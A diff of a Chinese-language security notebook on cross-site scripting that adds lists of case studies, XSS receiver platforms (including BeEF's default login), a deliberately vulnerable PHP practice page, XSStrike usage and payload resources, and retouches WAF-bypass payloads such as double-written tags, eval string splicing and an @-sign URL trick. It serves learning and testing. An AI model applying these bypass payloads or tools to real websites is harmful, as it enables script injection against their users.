@@ -8,15 +8,93 @@
 
 ---
 
-## Reference
+**案例**
+- [BugBounty：Twitter 蠕虫 XSS](https://xz.aliyun.com/t/5050)
+- [T00LS帖子正文XSS](https://www.hackersb.cn/hacker/235.html)
+- [The adventures of xss vectors in curious places](https://github.com/Dliv3/Venom)
+- [通过XSS窃取localStorage中的JWT](http://www.arkteam.net/?p=4453)
 
-- [XSS插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
-- [XSS总结](https://xz.aliyun.com/t/4067)
-- [WAF的XSS绕过姿势](https://www.freebuf.com/articles/web/81959.html)
+**xss 平台**
+- **开源平台**
+    - [firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver)
+
+- **在线平台**
+    - http://xssye.com/index.php
+
+- **beef**
+
+    - 文章
+        - [浏览器攻击框架 BeEF Part 1](https://www.freebuf.com/articles/web/175755.html)
+        - [浏览器攻击框架 BeEF Part 2：初始化控制](https://www.freebuf.com/articles/web/176139.html)
+        - [浏览器攻击框架 BeEF Part 3：持续控制](https://www.freebuf.com/articles/web/176550.html)
+        - [浏览器攻击框架 BeEF Part 4：绕过同源策略与浏览器代理](https://www.freebuf.com/articles/web/176873.html)
+        - [浏览器攻击框架 BeEF Part 5：Web应用及网络攻击测试](https://www.freebuf.com/articles/web/176912.html)
+
+        默认端口为 3000,默认路径是`/ui/authentication`,默认用户名和密码 beef
+
+**xss 检测环境/靶场**
+- **本地靶机**
+
+    **简单版**
+    ```php
+    <?php
+    $input=$_GET["parm"];
+    echo "<div>".$input."</div>";
+    ?>
+    ```
+    然后访问 xxx.xxx.xxx.xxx/1.php?parm= 加上你的xss代码
+
+    **进阶版**
+    - [xss 练习源码](../../assets/file/安全/xss练习源码.zip)
+    - [XSS 通关小游戏以及我的挑战思路分享](https://bbs.ichunqiu.com/thread-15664-1-1.html)
+
+    **在线版**
+    - http://demo.testfire.net/
+    - https://juice-shop.herokuapp.com/#/search
+
+**文章**
+- [XSS 插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
+- [XSS 总结](https://xz.aliyun.com/t/4067)
+- [WA F的 XSS 绕过姿势](https://www.freebuf.com/articles/web/81959.html)
 - [他山之石 | 对 XSS 的一次深入分析认识](https://www.freebuf.com/articles/web/195507.html)
 - [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)
-- [深入理解浏览器解析机制和XSS向量编码](http://bobao.360.cn/learning/detail/292.html)
-- [csp与bypass的探讨(译文)](http://wutongyu.info/csp-2015/)
+- [深入理解浏览器解析机制和 XSS 向量编码](http://bobao.360.cn/learning/detail/292.html)
+- [csp 与 bypass 的探讨(译文)](http://wutongyu.info/csp-2015/)
+
+**工具**
+- [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - 凑合着用吧,效果一般
+    - 依赖
+        ```bash
+        pip3 install -r requirements.txt
+
+        wget https://github.com/mozilla/geckodriver/releases/download/v0.24.0/geckodriver-v0.24.0-linux64.tar.gz
+        mkdir /usr/local/temp
+        mv geckodriver /usr/local/temp
+        PATH=$PATH:/usr/local/temp/
+        ```
+
+    - **[Usage](https://github.com/s0md3v/XSStrike/wiki/Usage#scan-a-single-url)**
+        ```bash
+        python3 xsstrike.py -u "http://example.com/search.php?q=query"
+        python3 xsstrike.py -u "http://example.com/search.php?q=query" --fuzzer
+        python3 xsstrike.py -u "http://example.com/search.php?q=query" --crawl
+        ```
+
+- [faizann24/XssPy](https://github.com/faizann24/XssPy)
+
+**payload**
+- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
+- [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
+- [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+
+**tips**
+- **Firefox 关闭 xss 过滤器**
+
+    about:config 把 rowser.urlbar.filter.javascript 改为 false
+
+- **chrome 关闭 xss 过滤器**
+
+    带参数启动 --args --disable-xss-auditor
 
 ---
 
@@ -177,8 +255,8 @@ background属性
 ```
 
 ## 绕过方法
-1. 使用无害的payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被HTML编码,是否标签被过滤,是否过滤<>等等；
-2. 如果过滤闭合标签,尝试无闭合标签的payload`<b,<i,<marquee`观察响应；
+1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等；
+2. 如果过滤闭合标签,尝试无闭合标签的 payload `<b,<i,<marquee` 观察响应；
 ```html
 绕过长度限制
 "onclick=alert(1)//
@@ -199,7 +277,7 @@ background属性
 
 
 双写关键字
-有些waf可能会只替换一次且是替换为空,这种情况下我们可以考虑双写关键字绕过
+有些 waf 可能会只替换一次且是替换为空,这种情况下我们可以考虑双写关键字绕过
 <imimgg srsrcc=x onerror=alert("xss");>
 
 
@@ -211,11 +289,11 @@ background属性
 
 
 字符拼接
-利用eval
+利用 eval
 <img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
 
 
-利用top
+利用 top
 <script>top["al"+"ert"](`xss`);</script>
 
 
@@ -328,12 +406,12 @@ onmousedown
 </style ><script>alert(1)</script>
 ```
 ```
-@符号绕过url限制
+@ 符号绕过 url 限制
 例如：https://www.segmentfault.com@xss.haozi.me/j.js
-其实访问的是@后面的内容
+其实访问的是 @ 后面的内容
 ```
 ```
-")逃逸函数后接分号
+") 逃逸函数后接分号
 例：");alert(1)//
 ```
 ```
